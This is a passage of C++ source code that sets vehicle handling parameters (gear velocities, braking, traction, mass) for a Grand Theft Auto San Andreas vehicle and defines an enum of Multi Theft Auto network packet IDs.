		veh->m_pHandlingData->m_transmissionData.m_aGears[5].m_fChangeDownVelocity = 2.424455;
		//////////////////////////////////////////////////////////////////////////////////////////
		veh->m_pHandlingData->m_transmissionData.m_aGears[0].m_fMaxVelocity = -0.847001;
		veh->m_pHandlingData->m_transmissionData.m_aGears[1].m_fMaxVelocity = 0.948641;
		veh->m_pHandlingData->m_transmissionData.m_aGears[2].m_fMaxVelocity = 1.558482;
		veh->m_pHandlingData->m_transmissionData.m_aGears[3].m_fMaxVelocity = 2.168322;
		veh->m_pHandlingData->m_transmissionData.m_aGears[4].m_fMaxVelocity = 2.778163;
		veh->m_pHandlingData->m_transmissionData.m_aGears[5].m_fMaxVelocity = 3.388004;
		//////////////////////////////////////////////////////////////////////////////////////////
		veh->m_pHandlingData->m_transmissionData.m_aGears[0].m_fChangeUpVelocity = -0.010000;
		veh->m_pHandlingData->m_transmissionData.m_aGears[1].m_fChangeUpVelocity = 0.632459;
		veh->m_pHandlingData->m_transmissionData.m_aGears[2].m_fChangeUpVelocity = 1.355222;
		veh->m_pHandlingData->m_transmissionData.m_aGears[3].m_fChangeUpVelocity = 1.965062;
		veh->m_pHandlingData->m_transmissionData.m_aGears[4].m_fChangeUpVelocity = 2.574903;
		veh->m_pHandlingData->m_transmissionData.m_aGears[5].m_fChangeUpVelocity = 3.388004;
		///////////////////////////////////////////////////////////////////////////////////////////
		veh->m_pHandlingData->m_fBrakeBias = 0.600000;
		veh->m_pHandlingData->m_fBrakeDeceleration = 0.004840;
		veh->m_pHandlingData->m_fCollisionDamageMultiplier = 0.175652;
		veh->m_pHandlingData->m_fDragMult = 1.000000;
		veh->m_pHandlingData->m_transmissionData.m_fEngineAcceleration = 0.006000;
		veh->m_pHandlingData->m_transmissionData.m_fEngineInertia = 167.580002;
		veh->m_pHandlingData->m_fMass = 2300.000000;
		//veh->m_pHandlingData->m_transmissionData.m_fMaxGearVelocity = 2.571002;
		//veh->m_pHandlingData->m_transmissionData.m_fMinGearVelocity = -0.847001;
		veh->m_pHandlingData->m_fSteeringLock = 40.000000;
		/*veh->m_pHandlingData->m_fSuspensionAntiDiveMultiplier = 0.350000;
		veh->m_pHandlingData->m_fSuspensionBiasBetweenFrontAndRear = 0.460000;
		veh->m_pHandlingData->m_fSuspensionDampingLevel = 0.100000;
		veh->m_pHandlingData->m_fSuspensionForceLevel = 1.000000;
		veh->m_pHandlingData->m_fSuspensionHighSpdComDamp = 0.000000;
		veh->m_pHandlingData->m_fSuspensionLowerLimit = -0.070000;
		veh->m_pHandlingData->m_fSuspensionUpperLimit = 0.150000;*/
		veh->m_pHandlingData->m_fTractionBias = 0.510000;
		veh->m_pHandlingData->m_fTractionLoss = 1.080000;
		veh->m_pHandlingData->m_fTractionMultiplier = 1.474200;
		veh->m_pHandlingData->m_fTurnMass = 8000.000000;
		veh->m_pHandlingData->m_transmissionData.m_nDriveType = 52;
		veh->m_pHandlingData->m_transmissionData.m_nEngineType = 80;
		veh->m_pHandlingData->m_transmissionData.m_nNumberOfGears = 5;
		veh->m_pHandlingData->m_vecCentreOfMass.x = 0.000000;
		veh->m_pHandlingData->m_vecCentreOfMass.y = 0.000000;
		veh->m_pHandlingData->m_vecCentreOfMass.z = -0.700000;
	}
}
enum ePacketID
{
	// Connection packets
	PACKET_ID_SERVER_JOIN = 0,
	PACKET_ID_SERVER_JOIN_DATA,
	PACKET_ID_SERVER_JOIN_COMPLETE,

	PACKET_ID_PLAYER_JOIN,
	PACKET_ID_PLAYER_JOINDATA,
	PACKET_ID_PLAYER_QUIT,
	PACKET_ID_PLAYER_TIMEOUT,

	PACKET_ID_MOD_NAME,
	PACKET_ID_PACKET_PROGRESS,
	PACKET_ID_MTA_RESERVED_03,
	PACKET_ID_MTA_RESERVED_04,
	PACKET_ID_MTA_RESERVED_05,
	PACKET_ID_MTA_RESERVED_06,
	PACKET_ID_MTA_RESERVED_07,
	PACKET_ID_MTA_RESERVED_08,
	PACKET_ID_MTA_RESERVED_09,
	PACKET_ID_MTA_RESERVED_10,
	PACKET_ID_MTA_RESERVED_11,
	PACKET_ID_MTA_RESERVED_12,
	PACKET_ID_MTA_RESERVED_13,
	PACKET_ID_MTA_RESERVED_14,
	PACKET_ID_MTA_RESERVED_15,
	PACKET_ID_SERVER_JOINEDGAME = 22,
	PACKET_ID_SERVER_DISCONNECTED,

	// All our outgoing only packets use this
	PACKET_ID_RPC,

	// Player packets
	PACKET_ID_PLAYER_LIST,
	PACKET_ID_PLAYER_SPAWN,
	PACKET_ID_PLAYER_WASTED,
	PACKET_ID_PLAYER_CHANGE_NICK,
	PACKET_ID_PLAYER_STATS,
	PACKET_ID_PLAYER_CLOTHES,

	// Main sync packets
	PACKET_ID_PLAYER_KEYSYNC,
	PACKET_ID_PLAYER_PURESYNC,
	PACKET_ID_PLAYER_VEHICLE_PURESYNC,
	PACKET_ID_LIGHTSYNC,
	PACKET_ID_VEHICLE_RESYNC,
	PACKET_ID_RETURN_SYNC,

	PACKET_ID_EXPLOSION,
	PACKET_ID_FIRE,
	PACKET_ID_PROJECTILE,
	PACKET_ID_DETONATE_SATCHELS,
	PACKET_ID_DESTROY_SATCHELS,

	// Console, chat and command packets
	PACKET_ID_COMMAND,
	PACKET_ID_CHAT_ECHO,
	PACKET_ID_CONSOLE_ECHO,
	PACKET_ID_DEBUG_ECHO,

	// Map related packets
	PACKET_ID_MAP_INFO,
	PACKET_ID_MAP_START,
	PACKET_ID_MAP_RESTART,
	PACKET_ID_MAP_STOP,

	// Entity related packets
	PACKET_ID_ENTITY_ADD,
	PACKET_ID_ENTITY_REMOVE,
	PACKET_ID_PICKUP_HIDESHOW,
	PACKET_ID_PICKUP_HIT_CONFIRM,

	// Vehicle related packets
	PACKET_ID_UNOCCUPIED_VEHICLE_STARTSYNC,
	PACKET_ID_UNOCCUPIED_VEHICLE_STOPSYNC,
	PACKET_ID_UNOCCUPIED_VEHICLE_SYNC,
	PACKET_ID_VEHICLE_SPAWN,
	PACKET_ID_VEHICLE_INOUT,
	PACKET_ID_VEHICLE_DAMAGE_SYNC,
	PACKET_ID_VEHICLE_TRAILER,

	// Ped sync
	PACKET_ID_PED_STARTSYNC,
	PACKET_ID_PED_STOPSYNC,
	PACKET_ID_PED_SYNC,
	PACKET_ID_PED_WASTED,

	// Rcon related
	PACKET_ID_PLAYER_RCON,
	PACKET_ID_PLAYER_RCON_LOGIN,
	PACKET_ID_PLAYER_RCON_KICK,
	PACKET_ID_PLAYER_RCON_BAN,
	PACKET_ID_PLAYER_RCON_MUTE,
	PACKET_ID_PLAYER_RCON_FREEZE,

	// Voice
	PACKET_ID_VOICE_DATA,
	PACKET_ID_VOICE_END,

	// Anticheat memory challenges
	PACKET_ID_CHEAT_CHALLENGEMEMORY,
	PACKET_ID_CHEAT_RETURN,

	// Map related packets
	PACKET_ID_MAP_LIST,
	PACKET_ID_LUA,
	PACKET_ID_LUA_ELEMENT_RPC,

	// GUI related packets
	PACKET_ID_TEXT_ITEM,

	// Score table updates
	PACKET_ID_SCOREBOARD,

	// Team related packets
	PACKET_ID_TEAMS,

	// Lua related packets
	PACKET_ID_LUA_EVENT,

	// Resource related packets
	PACKET_ID_RESOURCE_START,
	PACKET_ID_RESOURCE_STOP,

	// Custom data related packets
	PACKET_ID_CUSTOM_DATA,

	// Camera related packets
	PACKET_ID_CAMERA_SYNC,

	// Object sync
	PACKET_ID_OBJECT_STARTSYNC,
	PACKET_ID_OBJECT_STOPSYNC,
	PACKET_ID_OBJECT_SYNC,

	PACKET_ID_UPDATE_INFO,
	PACKET_ID_DISCONNECT_MESSAGE,
	PACKET_ID_PLAYER_TRANSGRESSION,
	PACKET_ID_PLAYER_DIAGNOSTIC,
	PACKET_ID_PLAYER_MODINFO,

	PACKET_ID_PLAYER_SCREENSHOT,
	PACKET_ID_RESOURCE_CLIENT_SCRIPTS,
	PACKET_ID_LATENT_TRANSFER,

	// Vehicle Push Sync
	PACKET_ID_VEHICLE_PUSH_SYNC,

	PACKET_ID_PLAYER_BULLETSYNC,
	PACKET_ID_SYNC_SETTINGS,
	PACKET_ID_WEAPON_BULLETSYNC,

	PACKET_ID_PED_TASK,

	PACKET_ID_PLAYER_NO_SOCKET,
	PACKET_ID_PLAYER_NETWORK_STATUS,
	PACKET_ID_PLAYER_ACINFO,
	PACKET_ID_CHAT_CLEAR,
	PACKET_ID_SERVER_INFO_SYNC,
	PACKET_ID_DISCORD_JOIN,
	PACKET_ID_PLAYER_RESOURCE_START,
};